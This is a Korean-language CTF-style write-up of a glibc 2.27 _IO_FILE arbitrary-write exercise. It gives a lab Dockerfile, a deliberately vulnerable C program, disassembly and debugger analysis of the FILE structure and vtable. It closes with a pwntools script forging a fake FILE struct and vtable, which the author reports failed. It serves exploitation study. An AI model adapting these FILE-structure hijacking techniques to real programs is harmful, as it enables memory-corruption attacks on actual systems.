# Exploit Tech: _IO_FILE Arbitrary Address Write

**Ubuntu 18.04 64-bit(Glibc 2.27) 실습 환경 Dockerfile**

```docker
FROM ubuntu:18.04
ENV PATH="${PATH}:/usr/local/lib/python3.6/dist-packages/bin"
ENV LC_CTYPE=C.UTF-8
RUN apt update
RUN apt install -y \
    gcc \
    git \
    python3 \
    python3-pip \
    ruby \
    sudo \
    tmux \
    vim \
    wget
# install pwndbg
WORKDIR /root
RUN git clone https://github.com/pwndbg/pwndbg
WORKDIR /root/pwndbg
RUN git checkout 2023.03.19
RUN ./setup.sh
# install pwntools
RUN pip3 install --upgrade pip
RUN pip3 install pwntools
# install one_gadget command
RUN gem install one_gadget -v 1.6.2
# install patchelf
WORKDIR /root
RUN apt install -y dh-autoreconf
RUN git clone https://github.com/NixOS/patchelf
WORKDIR /root/patchelf
RUN git checkout 0.17.2
RUN ./bootstrap.sh
RUN ./configure
RUN make
RUN make check
RUN sudo make install
WORKDIR /root
```

```bash
CONTAINER_NAME=my_container; \
docker build . -t ubuntu1804; \
docker run -d -t --privileged --name=$CONTAINER_NAME ubuntu1804; \
docker exec -it -u root $CONTAINER_NAME bash
```

**iofile_aaw.c**

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char flag_buf[1024];
int overwrite_me;

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int read_flag() {
  FILE *fp;
  fp = fopen("/home/iofile_aaw/flag", "r");
  fread(flag_buf, sizeof(char), sizeof(flag_buf), fp);

  write(1, flag_buf, sizeof(flag_buf));
  fclose(fp);
}

int main() {
  FILE *fp;

  char file_buf[1024];

  init();

  fp = fopen("/etc/issue", "r");

  printf("Data: ");

  read(0, fp, 300);

  fread(file_buf, 1, sizeof(file_buf)-1, fp);

  printf("%s", file_buf);

  if( overwrite_me == 0xDEADBEEF)
    read_flag();

  fclose(fp);
}
```

```bash
pwndbg> checksec
[*] '/root/io/IO/iofile_aaw'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

<br>

**코드 분석**

코드에 나와있듯이 `overwrite_me`만 특정 값으로 바꾸면 플래그가 나오는 코드이다.   

근데 read 는 안전하게 heap 에 저장될 것 같고 .. 건들 수 있는게 뭐가 있을까 고민을 하다가 일단 실행을 시켜봤다.    

<br>


**동적 분석**

```bash
pwndbg> disassem main
Dump of assembler code for function main:
   0x000000000040082b <+0>:     push   rbp
   0x000000000040082c <+1>:     mov    rbp,rsp
   0x000000000040082f <+4>:     sub    rsp,0x420
   0x0000000000400836 <+11>:    mov    rax,QWORD PTR fs:0x28
   0x000000000040083f <+20>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400843 <+24>:    xor    eax,eax
   0x0000000000400845 <+26>:    mov    eax,0x0
   0x000000000040084a <+31>:    call   0x400787 <init>
   0x000000000040084f <+36>:    lea    rsi,[rip+0x14e]        # 0x4009a4
   0x0000000000400856 <+43>:    lea    rdi,[rip+0x15f]        # 0x4009bc
   0x000000000040085d <+50>:    call   0x400690 <fopen@plt>
   0x0000000000400862 <+55>:    mov    QWORD PTR [rbp-0x418],rax
   0x0000000000400869 <+62>:    lea    rdi,[rip+0x157]        # 0x4009c7
   0x0000000000400870 <+69>:    mov    eax,0x0
   0x0000000000400875 <+74>:    call   0x400660 <printf@plt>
   0x000000000040087a <+79>:    mov    rax,QWORD PTR [rbp-0x418]
   0x0000000000400881 <+86>:    mov    edx,0x12c
   0x0000000000400886 <+91>:    mov    rsi,rax
   0x0000000000400889 <+94>:    mov    edi,0x0
   0x000000000040088e <+99>:    call   0x400670 <read@plt>
   0x0000000000400893 <+104>:   mov    rdx,QWORD PTR [rbp-0x418]
   0x000000000040089a <+111>:   lea    rax,[rbp-0x410]
   0x00000000004008a1 <+118>:   mov    rcx,rdx
   0x00000000004008a4 <+121>:   mov    edx,0x3ff
   0x00000000004008a9 <+126>:   mov    esi,0x1
   0x00000000004008ae <+131>:   mov    rdi,rax
   0x00000000004008b1 <+134>:   call   0x400620 <fread@plt>
   0x00000000004008b6 <+139>:   lea    rax,[rbp-0x410]
   0x00000000004008bd <+146>:   mov    rsi,rax
   0x00000000004008c0 <+149>:   lea    rdi,[rip+0x107]        # 0x4009ce
   0x00000000004008c7 <+156>:   mov    eax,0x0
   0x00000000004008cc <+161>:   call   0x400660 <printf@plt>
   0x00000000004008d1 <+166>:   mov    eax,DWORD PTR [rip+0x200bc9]        # 0x6014a0 <overwrite_me>
   0x00000000004008d7 <+172>:   cmp    eax,0xdeadbeef
   0x00000000004008dc <+177>:   jne    0x4008e8 <main+189>
   0x00000000004008de <+179>:   mov    eax,0x0
   0x00000000004008e3 <+184>:   call   0x4007ca <read_flag>
   0x00000000004008e8 <+189>:   mov    rax,QWORD PTR [rbp-0x418]
   0x00000000004008ef <+196>:   mov    rdi,rax
   0x00000000004008f2 <+199>:   call   0x400640 <fclose@plt>
   0x00000000004008f7 <+204>:   mov    eax,0x0
   0x00000000004008fc <+209>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000400900 <+213>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000400909 <+222>:   je     0x400910 <main+229>
   0x000000000040090b <+224>:   call   0x400650 <__stack_chk_fail@plt>
   0x0000000000400910 <+229>:   leave
   0x0000000000400911 <+230>:   ret
```

read 를 실행하는 main+99 에 브레이크를 걸고 실행을 시켰다.   

<br>

<img width="1403" height="568" alt="image (57)" src="https://github.com/user-attachments/assets/bdd1733a-7f45-459b-9ee8-bb173c1caf0e" />

rsi 에는 fd 주소인 0x602260 이 들어있었고 ni로 read를 실행시켜서 AAAA 를 넣어줬다.   

<br>

<img width="1321" height="1073" alt="image (58)" src="https://github.com/user-attachments/assets/81d3e90c-6f05-494d-9ed4-aea9d3ef1fbb" />

그러면 이렇게 값이 들어가있고 내부에 무슨 값들이 몇개 들어있었다.  
그래서 혹시나 이전에 읽은 /etc/issue 와 관련된 값인가? 싶어서 찾아보니  

<br>

<img width="1435" height="171" alt="image (59)" src="https://github.com/user-attachments/assets/ed0546e1-7dd8-47ea-a367-5daa0f3ee132" />

IO FILE 구조체와 관련된 값인 걸 찾았다.    
0xfbad2086 가 정확히 어떤 역할인진 모르겠으나 IO 구조체의 flag 값이 아닐까 싶다.     

생각해보니 read 로 fp 에 저장을 시키는거니까 io file 구조체를 마음대로 가지고 놀 수 있게 문제에서 다 내어준 거였다.     

아무튼 이제 방향을 확실하게 잡았다. 구조체를 수정해서 overwrite_me 를 원하는 값으로 써주자. 그럴려면 일단 IO FILE 구조체가 어떻게 생겼는지 알아야겠다.   

저  0x00007ffff7dce680 안에 있는 값이 0xfbad2086 로 flag 위치인것 같으니까 저 위치는 기준으로 IO FILE 구조체 위치를 뽑아내봤다.    

<br>

<img width="1333" height="1169" alt="image (60)" src="https://github.com/user-attachments/assets/58c58e0b-a5f1-437d-ac90-c7a48e943cdc" />

이렇게 맞게 채워진것같다.   

<br>

<img width="1361" height="494" alt="image (61)" src="https://github.com/user-attachments/assets/14904c2b-2ed7-4d0b-87c4-6839edc17c91" />

깔끔하게 뽑아보면 이런느낌    

<br>

<img width="1298" height="770" alt="image (62)" src="https://github.com/user-attachments/assets/a7be1591-37e3-461c-9a08-66d3932f63bc" />

그리고 젤 중요한 vtable을 뽑아보면 이렇게 생겼다.  
핵심은 xsgetn 멤버 변수를 건드리는거다.  

이제 얘를 원하는 모양으로 바꿔두고 내가 원하는 장소에 숨겨두자  
그리고 그렇게 만들어낸 새로운 구조체를 읽히면 원하는 동작이 가능할 것이다.  

<br>

<img width="1603" height="773" alt="image (63)" src="https://github.com/user-attachments/assets/db81ac16-a97a-422b-91de-d000188e0a0c" />

내가 원하는건 overwrite_me 변수를 수정하는거니까 주소를 알아놔야지.   
전역변수고 값없이 선언된상태니까 아마 data 영역일거고 권한 역시 충분하다.    

자 그럼 이제 준비가 전부 끝났다 0x6014a0 주소에 바로 원하는 값을 집어넣어버리자.     

근데 여기서 답을 찾는데 시간이 좀 걸렸다.  

값을 어떻게 넣을지 감이 안잡혀서 여러 시도를 해봤다.   

- 가젯 체인 짜서 변수 값 바꾸기→ overwrite_me 를 덮기엔 모든 가젯이 없음
- execve로 쉘 실행 → syscall 가젯이 없음

등등 가젯을 이용한 건 가젯이 없어서 만들어지질 않았다.   

```scss
fread()
 └── _IO_fread()
       └── _IO_sgetn(fp, data, n)
             └── _IO_XSGETN(fp, data, n)
                   └── fp->vtable->__xsgetn(fp, data, n)
                           └── _IO_file_xsgetn(...)  ← 파일 읽기

```

그래서 이전 Write up을 계속 읽다가 찾아낸게    
위 구조로 쭉 호출을 하고, 살펴보면 fp, data, n 인자가 쭉 그대로 들고가진다.   

그러면 pop rdi, pop rsi 가젯은 있으니까 이걸 이용하면 되지않나? 라는 생각이 들어서   
xsgetn 에 pop rdi ; ret ; 을 넣고 그대로 해봤는데 안된다.  

<br>

**실패 익스플로잇 코드**

```python
from pwn import *

p = process('./iofile_aaw')
e = ELF('./iofile_aaw')

p.recvuntil(b'Data')

overwrite_me = e.symbols['overwrite_me']
pop_rdi = 0x400983
pop_rsi = 0x400981

fake_vtable_addr = 0x602250 + 0x100

fake_IO = flat(
    0xfbad2488,        # _flags
    0, 0, 0,           # _IO_read_xxx
    0, 0, 0,           # _IO_write_xxx
    0, 0, 0, 0, 0,     # buffers
    0, 0,              # marker, chain
    0,                 # fileno
    0,                 # flags2
    0,                 # old_offset
    0,                 # cur_column
    0,                 # vtable_offset
    0, 0, 0, 0, 0, 0,  # dummy
    fake_vtable_addr   # vtable
)

fake_vtable = flat(
    0, 0, 0, 0, 0, 0, 0, 0,
    pop_rdi
)

payload = fake_IO.ljust(0x100, b'\x00') 
payload += fake_vtable

payload += flat(
    pop_rdi,
    overwrite_me,
    pop_rsi,
    0xDEADBEEF, 
    0x0 
)

p.send(payload)

p.interactive()
```

<img width="1274" height="470" alt="image (64)" src="https://github.com/user-attachments/assets/493f923f-b1db-4ce6-bcf7-a50197512c25" />

어디서 틀린건지 서칭을 해본 결과 레지스터를 저렇게 바꿔도 fd data n 같은 값은 IO 구조체에 있는 멤버 변수로 가져오는거라고 한다.   
그래서 fd 를 overwrite_me 로 바꾸고 싶었다면 `_IO_buf_base` 를 만졌어야했다…    
